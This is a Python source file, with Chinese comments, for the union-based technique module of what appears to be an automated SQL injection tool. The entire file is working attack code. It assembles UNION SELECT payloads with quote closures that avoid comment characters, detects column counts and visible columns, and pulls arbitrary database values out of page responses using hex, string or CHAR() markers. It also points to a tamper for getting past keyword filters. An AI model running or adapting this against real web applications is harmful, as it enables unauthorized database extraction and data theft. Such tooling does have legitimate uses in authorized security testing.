# -*- coding: utf-8 -*-
"""联合注入（v1.1：多种回显标记编码 + 无注释闭合）

标记编码会依次尝试：hex(MySQL) → 引号字符串(通用) → CHAR() 拼接。
hex 是最省事的，但不是每个 DBMS/场景都成立
（例如 SQLite 把 0x.. 当整数，回显出来是数字而不是字符串），
所以探测阶段会换着试，选一个能真正回显标记的。
"""
import re
from techniques.base import BaseTechnique


class UnionTechnique(BaseTechnique):
    name = "Union Based"

    # (起始标记表达式, 结束标记表达式, 起始文本, 结束文本)
    MARKER_FORMS = [
        ("0x58715A39", "0x5A713958", "XqZ9", "Zq9X"),
        ("'XqZ9'", "'Zq9X'", "XqZ9", "Zq9X"),
        ("CHAR(88,113,90,57)", "CHAR(90,113,57,88)", "XqZ9", "Zq9X"),
    ]

    MARKER_LABELS = ["hex(0x..)", "引号字符串", "CHAR() 拼接"]

    def __init__(self, *args, force_cols=None, force_visible_col=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.col_count = force_cols or 0
        self.visible_col = force_visible_col or 0
        self.marker_idx = 0
        self.concat_tpl = self.dialect.concat_templates()[0]

    # ---------------- payload 组装 ----------------
    def _union_payload(self, select_body):
        """按闭合方式拼装；全程不使用注释符（无注释即可应对注释被禁）。"""
        closure = (self.det.closure_name or "numeric").lower()
        body = f"UNION SELECT {select_body}"

        if "paren-numeric" in closure:
            return f"-1) {body}"
        if closure.startswith("single") or "paren-single" in closure:
            return f"-1' {body} AND '1'='1"
        if closure.startswith("double"):
            return f'-1" {body} AND "1"="1'
        # 数字型：天然合法，无需注释
        return f"-1 {body}"

    def _s_expr(self):
        return self.MARKER_FORMS[self.marker_idx][0]

    def _e_expr(self):
        return self.MARKER_FORMS[self.marker_idx][1]

    def _s_str(self):
        return self.MARKER_FORMS[self.marker_idx][2]

    def _e_str(self):
        return self.MARKER_FORMS[self.marker_idx][3]

    # ---------------- 回显识别 ----------------
    # 很多靶子（尤其开了 debug）会把执行的 SQL 一起回显出来，
    # 那样 payload 里的标记文本也会出现在页面里，天真地 grep 会读到 payload 自己。
    # 下面两个方法只认「没被引号/HTML 实体前导」的标记出现。
    _PRE_ENTITIES = ("&#x27;", "&quot;", "&apos;", "&#39;")

    def _marker_present(self, text):
        for m in re.finditer(re.escape(self._s_str()), text):
            pre1 = text[max(0, m.start() - 1):m.start()]
            pre6 = text[max(0, m.start() - 6):m.start()]
            if pre1 in ("'", '"') or pre6.endswith(self._PRE_ENTITIES):
                continue
            return True
        return False

    def _extract_between(self, text):
        pattern = (re.escape(self._s_str()) + r"(.*?)" + re.escape(self._e_str()))
        for m in re.finditer(pattern, text, re.DOTALL):
            val = m.group(1)
            pre1 = text[max(0, m.start() - 1):m.start()]
            pre6 = text[max(0, m.start() - 6):m.start()]
            # 跳过 payload 自身的回显：内容里带 SQL 语法字符，或紧跟在引号之后
            if any(ch in val for ch in "'\"()|=,<>"):
                continue
            if pre1 in ("'", '"') or pre6.endswith(self._PRE_ENTITIES):
                continue
            return val.strip()
        return ""

    # ---------------- 标记形式顺序 ----------------
    def _form_order(self):
        # MySQL 上 hex 最省事；其它 DBMS 上引号字符串更靠谱（hex 常被当整数）
        if self.dialect.name == "mysql":
            return [0, 1, 2]
        return [1, 0, 2]

    # ---------------- 探测 ----------------
    def probe(self):
        if self.col_count > 0 and self.visible_col > 0:
            print(f"    [+] 使用手动指定: 列数={self.col_count}, 可见列={self.visible_col}")
            return True

        for idx in self._form_order():
            self.marker_idx = idx
            if self._probe_columns() and self._selftest():
                print(f"    [+] 回显标记: {self.MARKER_LABELS[idx]}")
                return True
        print("    [-] 联合注入探测失败（union 关键字是否被拦？可用 --tamper keyword_nest）")
        return False

    def _selftest(self):
        """端到端自检：拿一个已知常量跑一次真正的 extract，确认提取链路可用。

        _probe_columns() 只验证了「标记能出现在页面上」，而**真正的提取**
        还要过一层 concat_templates() 拼接 —— 方言判断错时会在这里露馅
        （典型：在 SQLite 上用了 MySQL 的 CONCAT，探测「成功」但提取恒为空）。
        不过这一关，就退化成「探测成功但一到取数据就全空」。

        刻意用**数字常量**（不带引号）：若目标过滤单引号，仍能通过自检。
        """
        probe = "98765"
        try:
            return self.extract(f"({probe})") == probe
        except Exception:
            return False

    def _probe_columns(self):
        if self.col_count <= 0:
            print(f"    [*] 探测列数...")
            found = 0
            for n in range(1, 16):
                nums = [self._s_expr()] * n
                payload = self._t(self._union_payload(",".join(nums)))
                r = self.req.send(payload)
                if r["status"] == -1:
                    continue
                if self._marker_present(r["text"]):
                    found = n
                    break
            if not found:
                return False
            self.col_count = found
            print(f"    [+] 列数: {found}")

        if self.visible_col <= 0:
            print(f"    [*] 探测可见列...")
            for i in range(1, self.col_count + 1):
                nums = ["NULL"] * self.col_count
                nums[i - 1] = self._s_expr()
                payload = self._t(self._union_payload(",".join(nums)))
                r = self.req.send(payload)
                if r["status"] == -1:
                    continue
                if self._marker_present(r["text"]):
                    self.visible_col = i
                    print(f"    [+] 可见列: 第 {i} 列")
                    return True
            return False
        return True

    # ---------------- 提取 ----------------
    def _cond_true(self, condition):
        return True

    def extract(self, sql_expr):
        nums = ["NULL"] * self.col_count
        nums[self.visible_col - 1] = self.concat_tpl.format(
            a=self._s_expr(), b=f"({sql_expr})", c=self._e_expr()
        )
        payload = self._t(self._union_payload(",".join(nums)))
        r = self.req.send(payload)
        if r["status"] == -1:
            return ""
        return self._extract_between(r["text"])

    def extract_length(self, sql_expr):
        return len(self.extract(sql_expr))
